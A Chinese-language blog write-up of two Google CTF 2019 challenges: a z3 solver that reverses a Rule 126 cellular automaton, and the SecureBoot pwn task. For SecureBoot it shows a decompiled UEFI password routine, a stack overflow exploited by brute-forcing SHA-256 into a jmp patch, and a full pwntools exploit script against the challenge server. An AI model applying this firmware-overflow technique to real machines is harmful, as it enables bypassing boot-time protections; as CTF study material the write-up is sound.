---
title: 2019-googlectf-writeup-part2
authorId: l1nk
date: 2019-07-30 23:31:47
tags:
  - googlectf
  - writeup
  - Pwn
  - Crypto
categories:
  - Writeup
---

2019 googlectf writeup 下半段

<!--more-->

2019 GoogleCTF part2
--------------------------

# Crypto
## Reverse a cellular automata
本质上为一个算法题（大雾）

### 题目描述
题目描述是说，当前使用了一种叫做胞元自动机**cellular automata**的东西（就是题目里面那个东西）的算法。这个东西解释起来有、、复杂，不过现实中很多地方都见过。胞元自动机相当于是定义了一种规则。假设我们定义了如下的`3*3`的方块:
```
= = =
= = =
= = =
```
假定如下的规则:

 * `=`表示活着的细胞
 * `+`表示死了的细胞
 * 定义一个规则：如果细胞四周（上下左右）有>=3个细胞存在，由于细胞养料不足，当前的细胞会死亡；否则，因为养料充足，细胞会重新活过来

胞元自动机是以**状态**为概念的。也就是说每一个细胞只考虑当前状态下周围的养料情况，不考虑下一个状态。那么根据规则，下一个状态的方块中的细胞会变成:
```
= + =
+ + +
= + =
```
可以注意到，此时**“死去”**了很多个细胞。虽然根据资源分配的话，四周的细胞死亡后，正中间的细胞本来是不必死去的，但是根据状态，它也会进入这个状态。然后再下一个状态就是:
```
= = =
= = =
= = =
```
恢复成最初的形状。这种就叫做胞元自动机的变化过程。
有很多的胞元自动机规则，分别就是规定了这种变化过程。题目中给出的`Wolfram rule 126`也是一种变化的规则:
![](http://showlinkroom.me/2019/07/29/GoogleCTF-2019/wp04.png)
第一排为当前状态。也就是说仅仅在**当前状态以及相邻两个状态均相等的时候，当前状态转变成0，否则转变成1**

### 题解
题目中给出了一个密文，并且给出了一个64bit下的胞元自动机生成的数字，推测出上一个状态，对应的数字作为密文的密钥即可解开答案:
```
Flag (base64)
U2FsdGVkX1/andRK+WVfKqJILMVdx/69xjAzW4KUqsjr98GqzFR793lfNHrw1Blc8UZHWOBrRhtLx3SM38R1MpRegLTHgHzf0EAa3oUeWcQ=
Obtained step (in hex)
66de3c1bf87fdfcf
```
这里观察`Rule 126`，可以发现一些规律。这里推荐网站[https://www.wolframalpha.com/input/?i=Rule+126](https://www.wolframalpha.com/input/?i=Rule+126)，里面已经帮我们总结了规律。
这种有规律，求解的问题都可以用`z3`来解决。这里参考[https://blog.julianjm.com/Google-CTF-2019/#Automata](https://blog.julianjm.com/Google-CTF-2019/#Automata)照着写了一个:
```python
from z3 import *

BITS = 64
target = 0x66de3c1bf87fdfcf

# Solver, which will help to get answer
solver = Solver()

# define the cell rule 
def cell(p, q, r):
    return Or(Xor(p,q), Xor(p,r))

#define the step for get step-answer

def step(src):
    return [cell(src[i-1], src[i], src[(i+1)%BITS]) for i in range(BITS)]


# define Bool array
src = BoolVector("src", BITS)
# and calculate the dst
dst = step(src)

# now add restriction
for i in range(BITS):
    mask = 1 << (BITS - 1 - i)
    solver.add (dst[i] == bool(target & mask))

# and calculate answer
while solver.check() == sat:
    model = solver.model()

    solbits = "".join(['1' if model.eval(src[i]) else '0' for i in range(BITS)])

    print("%x"%int(solbits, 2))

    # here we add a list into solver to tell solver that we don't need this kind of answer, so 
    # z3 will show another answer
    solver.add(Or([ model[v]!=v for v in src]))
```
_基本上是把人家的搬运了一下。。。_
这个输出非常多，可以用bash脚本之类的主动调用题目中给出的解题指令，即可得到答案。


## SecureBoot
```
Your task is very simple: just boot this machine. We tried before but we always get ‘Security Violation’. For extra fancyness use socat -,raw,echo=0 tcp:$IP:$PORT'.
```

这个题目是一个pwn题，从名字中可以知道应该是和一个叫做**Secure Boot**的特性相关的一个题目。这个特性其实是关于UEFI(Unified Extensible Firmware Interface)的一个子特性。

用`binwalk`查看之后，发现是一个UEFI文件，然后用`UEFITool`查看之后发现里面内容如下:
![](http://showlinkroom.me/2019/07/29/GoogleCTF-2019/wp11.png)
官方给出的`run.py`脚本如下:
```python
#!/usr/bin/python3
import os
import tempfile

fname = tempfile.NamedTemporaryFile().name

os.system("cp OVMF.fd %s" % (fname))
os.system("chmod u+w %s" % (fname))
os.system("qemu-system-x86_64 -monitor /dev/null -m 128M -drive if=pflash,format=raw,file=%s -drive file=fat:rw:contents,format=raw -net none -nographic 2> /dev/null" % (fname))
os.system("rm -rf %s" % (fname))
```

其中`qemu`那段启动的内容意思为:

 * `-monitor /dev/null`：将监视器重定向到主机的空白设备。
 * `-m 128M`: 设置启动时候的RAM大小为128M
 * `-drive if=pflash,format=raw,file=%s`: 设置一个驱动，同时可以设置相关的设备类型。这里设置的设备接口为`pflash`(闪存，相当于是连接了bios的那个东东)，磁盘格式为`raw`，意味着不需要检测格式头，然后定义了当前的`OVMF.fd`作为当前的操作镜像。这句话相当于是**模拟了一个写有UEFI的闪存挂载到操作系统上的一个过程**
 * `-drive file=fat:rw:contents,format=raw`： 同理，这句话设置了一个驱动，不过这里是将`contents`目录作为硬盘格式挂载到这上面（标注为raw之后就不需要关注是不是MBR/GPT的磁盘了）
 * `-net none`: 不支持网络通信
 * `2 > /dev/null`: 重定向错误流


尝试运行这段内容后，程序会输出:
```
UEFI Interactive Shell v2.2
EDK II
UEFI v2.70 (EDK II, 0x00010000)
Mapping table
      FS0: Alias(s):HD1a1:;BLK3:
          PciRoot(0x0)/Pci(0x1,0x1)/Ata(0x0)/HD(1,MBR,0xBE1AFDFA,0x3F,0xFBFC1)
     BLK0: Alias(s):
          PciRoot(0x0)/Pci(0x1,0x0)/Floppy(0x0)
     BLK1: Alias(s):
          PciRoot(0x0)/Pci(0x1,0x0)/Floppy(0x1)
     BLK2: Alias(s):
          PciRoot(0x0)/Pci(0x1,0x1)/Ata(0x0)
     BLK4: Alias(s):
          PciRoot(0x0)/Pci(0x1,0x1)/Ata(0x0)

If Secure Boot is enabled it will verify kernel's integrity and
return 'Security Violation' in case of inconsistency.
Booting...
Script Error Status: Security Violation (line number 5)
```
根据输出，我们知道当前的`OVMF.fd`中的UEFI开启了`SecureBoot`的特性，而当前内核并没有签名，导致了内核没有能够加载。

### 企图绕过
在UEFI加载的时候，有四个阶段
```
SEC(安全检测，完成从flat mode 到 real mode)--PEI(EFI前期初始化，初始化各个模块，CPU/IO等等)--DXE(初始化各类驱动)--BDS(初始化键鼠驱动，VGA等等)
```
但在这四个阶段之后，还会有一个叫做`TSL(操作系统加载前期)`的阶段，这个阶段中就是在最初的UEFI加载完成之后（但是还没有尝试开始运行的时候），会从主板上(CMOS处)加载关于UEFI的配置（也就是通常说的进入BIOS）。在这之后才会正式进入`RT(Runtime)`加载操作系统等等。
所以想到，我们可以通过手动修改BIOS的配置来关闭`SecureBoot`。但是该题没有告诉我们到底怎么进入BIOS，此时只能一通乱按，终于发现是在按下了`f12`的时候可以打开这个界面:
```
BdsDxe: loading Boot0000 "UiApp" from Fv(7CB8BDC9-F8EB-4F34-AAEA-3EE4AF6516A1)/FvFile(462CAA21-7614-4503-836E-8AB6F4662331)
BdsDxe: starting Boot0000 "UiApp" from Fv(7CB8BDC9-F8EB-4F34-AAEA-3EE4AF6516A1)/FvFile(462CAA21-7614-4503-836E-8AB6F4662331)
****************************
*                          *
*   Welcome to the BIOS!   *
*                          *
****************************

Password?
****
```
这里会发现，程序在`DXE`阶段加载了一个好叫做`UiAPP`的文件，并且要求我们输入密码。于是这里想到说，这个`UiAPP`可能是实现了输入密码功能的一个自定义的EFI文件。此时我们注意到`7CB8BDC9-F8EB-4F34-AAEA-3EE4AF6516A1`这个值，这个值我们在`UEFITool`的截图中看到过。
![](http://showlinkroom.me/2019/07/29/GoogleCTF-2019/wp12.png)
于是想到，能不能将这个文件导出来看一下。这里使用工具`uefi-firmware-parser`进行导出:
```
uefi-firmware-parser -ecO ./OVMF.fd
```
输出中可以开到如下的内容:
```
File 38: 462caa21-7614-4503-836e-8ab6f4662331 type 0x09, attr 0x00, state 0x07, size 0x1beae (114350 bytes), (application)
Section 0: type 0x10, size 0x1be44 (114244 bytes) (PE32 image section)
Section 1: type 0x19, size 0x34 (52 bytes) (Raw section)
Section 2: type 0x15, size 0x10 (16 bytes) (User interface name section)
Name: UiApp
Section 3: type 0x14, size 0xe (14 bytes) (Version section section)
```
这段就是我们需要找到的内容(目录有点深，得搜索出来才行)
```
SecureBoot\OVMF.fd_output\volume-0\file-9e21fd93-9c72-4c15-8c4b-e77f1db2d792\section0\section3\volume-ee4e5898-3914-4259-9d6e-dc7bd79403cf\file-462caa21-7614-4503-836e-8ab6f4662331
```

### 漏洞点
首先利用全局搜索找到字符串L"Password"，发现其相关函数如下:
```
__int64 checkPassword()
{
  unsigned __int16 index; // ax
  char v2; // [rsp+2Ch] [rbp-BCh]
  __int16 chr; // [rsp+2Eh] [rbp-BAh]
  char v4; // [rsp+30h] [rbp-B8h]
  char buffer[128]; // [rsp+38h] [rbp-B0h]
  __int64 v6; // [rsp+B8h] [rbp-30h]
  _QWORD *v7; // [rsp+C0h] [rbp-28h]
  __int64 v8; // [rsp+C8h] [rbp-20h]
  unsigned __int16 i; // [rsp+D6h] [rbp-12h]
  unsigned __int64 error_time; // [rsp+D8h] [rbp-10h]

  error_time = 0i64;
  v8 = 32i64;
  wputs(L"****************************\n");
  wputs(L"*                          *\n");
  wputs(L"*   Welcome to the BIOS!   *\n");
  wputs(L"*                          *\n");
  wputs(L"****************************\n\n");
  v7 = (_QWORD *)Initialize(32i64);
  while ( error_time <= 2 )
  {
    i = 0;
    wputs(L"Password?\n");
    while ( 1 )
    {
      while ( 1 )
      {
        v6 = (*(__int64 (__fastcall **)(_QWORD, char *))(*(_QWORD *)(qword_1BC68 + 48) + 8i64))(
               *(_QWORD *)(qword_1BC68 + 48),
               &v2);
        if ( v6 >= 0 )
        {
          if ( chr )
            break;
        }
        if ( v6 == 0x8000000000000006i64 )
          (*(void (__fastcall **)(__int64, __int64, char *))(qword_1BC78 + 96))(
            1i64,
            *(_QWORD *)(qword_1BC68 + 48) + 16i64,
            &v4);
      }
      if ( chr == '\r' )
        break;
      if ( i <= 139u )
      {
        index = i++;
        buffer[index] = chr;
      }
      wputs("*");
    }
    buffer[i] = 0;
    wputs(L"\n");
    sha256((__int64)buffer, i, (__int64)v7);
    if ( *v7 == 0xDEADBEEFDEADBEEFi64
      && v7[8] == 0xDEADBEEFDEADBEEFi64
      && v7[16] == 0xDEADBEEFDEADBEEFi64
      && v7[24] == 0xDEADBEEFDEADBEEFi64 )
    {
      sub_C46((__int64)v7);
      return 1i64;
    }
    wputs("W");
    ++error_time;
  }
  sub_C46((__int64)v7);
  return 0i64;
}
```
程序要求我们输入128个字节，然后将这128个字节进行sha256，结果要为四个`DEADBEEFDEADBEEF`的时候，就会返回1表示密码输入正确。
这里会发现一个很显眼的漏洞点:程序允许我们读入140字节，但是申请的空间却只有128个字节那么大。总共可以多溢出12个字节。由于这里是位于EFI程序中，此时地址并不是特别高位，所以可以粗略的认为我们**此时可以修改v6和v7处的变量**。

从定义上可以发现，v7是一个地址，而我们栈溢出又正好可以溢出到v7的地址处，于是一个自然的想法就是，**通过爆破sha256，得到一个粗略任意地址写**的一个漏洞（因为必须要将buffer进行sha256，所以这个写入也不是那么受控制，不过如果控制了v7相当于是可以往部分位置写数据了）

那么要往哪里写呢？这个倒是一个大问题，毕竟这个题目不是在通常的运行环境下，没有`libc`等一系列东西，所以得考虑用别的办法。不过其实考虑到，**分页保护这个过程发生在操作系统加载之后**，那么应该会意识到，此时的EFI程序**应该是不存在页保护的**。


### 动态调试

修改题目中给出的`run.py`
```python
#!/usr/bin/python3
import os
import tempfile

fname = tempfile.NamedTemporaryFile().name

os.system("cp OVMF.fd %s" % (fname))
os.system("chmod u+w %s" % (fname))
print("Here")
os.system("qemu-system-x86_64 -monitor /dev/null -m 128M -drive if=pflash,format=raw,file=%s -drive file=fat:rw:contents,format=raw -net none -gdb tcp::1234 -S -nographic 2> /dev/null" % (fname))
# 增加gdb选项，并且增加-S，表示等待调试器连接上才运行
os.system("rm -rf %s" % (fname))
```
之后启动gdb，然后输入
```
target remote 127.0.0.1:1234
```
即可连接调试。
链接进去后用手速进入输入password的界面，然后断下来，检查内部执行情况可以发现，此时的程序段的确都是可执行的:
![](http://showlinkroom.me/2019/07/29/GoogleCTF-2019/wp13.png)
之后有一个满头疼的点，我们需要找到此时的`uiapp`被映射的位置。这里似乎没有什么好办法，只能说翻找栈看看第三位有没有和IDA相同的数字了。通过逆向分析，可以知道如下的汇编:
```
.text:000000000000FF1E
.text:000000000000FF1E loc_FF1E:                               ; CODE XREF: checkPassword+C2↑j
.text:000000000000FF1E                 mov     rax, 8000000000000006h
.text:000000000000FF28                 cmp     [rsp+0E8h+var_30], rax
.text:000000000000FF30                 jz      short loc_FF35
.text:000000000000FF32                 nop
.text:000000000000FF33                 jmp     short loc_FEDE
.text:000000000000FF35 ; ---------------------------------------------------------------------------
.text:000000000000FF35
.text:000000000000FF35 loc_FF35:                               ; CODE XREF: checkPassword+E0↑j
.text:000000000000FF35                 mov     rax, cs:qword_1BC78
.text:000000000000FF3C                 mov     rax, [rax+60h]
.text:000000000000FF40                 mov     rdx, cs:qword_1BC68
.text:000000000000FF47                 mov     rdx, [rdx+30h]
.text:000000000000FF4B                 add     rdx, 10h
.text:000000000000FF4F                 lea     rcx, [rsp+0E8h+var_B8]
.text:000000000000FF54                 mov     r8, rcx
.text:000000000000FF57                 mov     ecx, 1
.text:000000000000FF5C                 call    rax ; 这里发生了类似scanf的调用
.text:000000000000FF5E                 jmp     loc_FEDE
```
猜想说此处的`rax`调用的正是读取数据的函数，所以我们此时需要查找栈中地址尾部为`F5E`的地址，最后成功找到再:
```
24:0120│   0x7ec17c8 —▸ 0x67daf5e ◂— jmp    0x67daede /* 0x44b70fffffff7be9 */  
```
于是可以计算出此时段的基地址为`67daf5e - ff5e = 67CB000`。

### 利用思路
代码段本身居然能被修改，而且没有开启`ASLR`，这意味这我们不需要leak就可以修改任意内容，我们需要巧妙的利用这一点。这里比较容易想到的一点就是**修改发生比较前后的代码**。将发生跳转的
```
.text:000000000000FFBE                 cmp     rdx, rax
.text:000000000000FFC1                 jz      short loc_10008; -------jump--from--here--->>
```
这个位置修改成`jmp $+b3`，那么就可以直接跳转到
```
.text:0000000000010074                 mov     eax, 1;   <------arrive--here-----
.text:0000000000010079                 jmp     short loc_100B4
```
不过查看反汇编，会发现`jmp +$0xb3`需要的字节码有、长，为`\xe9\xae\x00\x00\x00`，因为这个地方有一个无符号数`0xb3`，而爆破这么长的字节显然不合适，但是**反向跳跃**不需要那么多字节:
```
.text:0000000000010074                 mov     eax, 1           ;<---------arrive here
.text:0000000000010079                 jmp     short loc_100B4
.text:000000000001007B loc_1007B:                              ; CODE XREF: checkPassword+173↑j
.text:000000000001007B                                         ; checkPassword+1D4↑j ...
.text:000000000001007B                 lea     rcx, aW         ; -------jump from here ---->  
.text:0000000000010082                 call    wputs
.text:0000000000010087                 add     [rsp+0E8h+var_10], 1
.text:0000000000010090
.text:0000000000010090 loc_10090:                              ; CODE XREF: checkPassword+73↑j
.text:0000000000010090                 cmp     [rsp+0E8h+var_10], 2  
.text:0000000000010099                 jbe     loc_FEC8
.text:000000000001009F                 mov     rax, [rsp+0E8h+exp]
.text:00000000000100A7                 mov     rdi, rax
.text:00000000000100AA                 call    sub_C46
.text:00000000000100AF                 mov     eax, 0
```
如果从指定的位置进行jmp的话，那么此时只需要`0x1007b - 0x10074=0x7`，也就是说此时只需要跳转`jmp $f9`(`\xeb\xf7`)即可:
那么接下来要做的事情就很简单了:

 * 溢出修改v7的值为`0x67db07b
 * 计算sha256，让开头两字节为`\xeb\xf7`

_说到调试问题，可以加入`-s`/`-gdb tcp::1234`表示进入调试模式，让程序先运行起来，然后本地使用gdb远程链接过去（此时注意qemu的命令行中不要加入`-S`防止被挂起）_

在调试期间发现一个漏掉的问题点:
```C
       v6 = (*(__int64 (__fastcall **)(_QWORD, char *))(*(_QWORD *)(qword_1BC68 + 48) + 8i64))(
               *(_QWORD *)(qword_1BC68 + 48),
               &v2);
        if ( v6 >= 0 )
        {
          if ( chr )
            break;
        }
        if ( v6 == 0x8000000000000006i64 )
          (*(void (__fastcall **)(__int64, __int64, char *))(qword_1BC78 + 96))(
            1i64,
            *(_QWORD *)(qword_1BC68 + 48) + 16i64,
            &v4);
      }
```
这个地方的`v6`在栈上位于`v7`之前，通过测试发现在读入我们的输入的时候会被置为`00000000`，所以在计算sha256的时候需要把这段默认为0，但是发送数据的时候这一段需要设置为任意可见字符防止被截断。
```python
#   -*- codingP:utf-8   -*-
#!/usr/bin/python3
from pwn import *
import os
import tempfile
import string
import hashlib

DEBUG = False
fname = ""
ph = None
exp_opcode = "jmp $-0x7"
# target_addr = 0x67db07b - 32 + 2
target_addr = 0x67db07b


if DEBUG:
    ph = process("./run.py")
    #context.log_level = 'debug'
    #context.terminal = ['tmux', 'splitw', '-h']
    #gdb.attach(ph)
else:
    ph = remote('secureboot.ctfcompetition.com', 1337)

def bruce(opcode):
    last_opcode = asm(opcode, arch="amd64", os="linux")
    for i in string.printable:
        for j in string.printable:
            for k in string.printable:
                payload = i + j + k + "A"*125 + '\x00'*8 + p32(target_addr)
                if hashlib.sha256(payload).digest()[:2] == last_opcode:
                    log.info("Find payload" + payload)
                    print(hashlib.sha256(payload).hexdigest())
                    payload = payload[0:128] + "A"*8 + payload[136:]
                    log.info("Find payload" + payload)
                    return payload

    log.info("Find nothing..")
    return ""

def exploit(ph):
    # input("wait for gdb")
    # just sleep to wait
    print ph.recvn(1)
    # sleep(1)
    ph.send("\x1b[24~")
    # sleep(1)

    print ph.recvuntil("Password")
    # a=raw_input("wait for gdb")
    payload = bruce(exp_opcode)
    # payload = "A"
    ph.send(payload+"\r")
    # ph.send('1010' + 'A' * 0x84 + p32(0x7ec18b8 - 32 + 1) + '\r')

def local(ph):
    exploit(ph)
    ph.interactive()
    print("Finish attack, will delete file")
    os.system("rm -rf %s" % (fname))

if __name__ == "__main__":
    # local(ph)
    exploit(ph)
    ph.interactive()

```

如果只是本地测试的话，可以使用
```
socat -,raw,echo=0 SYSTEM:"python exploit.py"
```
来进行启动，会得到如下的画面:
![](http://showlinkroom.me/2019/07/29/GoogleCTF-2019/wp14.png)
然后设置一下`Secure Boot`就能够让其正常启动。修改成`remote`模式之后即可到达最终答案

![](http://showlinkroom.me/2019/07/29/GoogleCTF-2019/wp15.png)
`CTF{pl4y1ng_with_v1rt_3F1_just_4fun}`
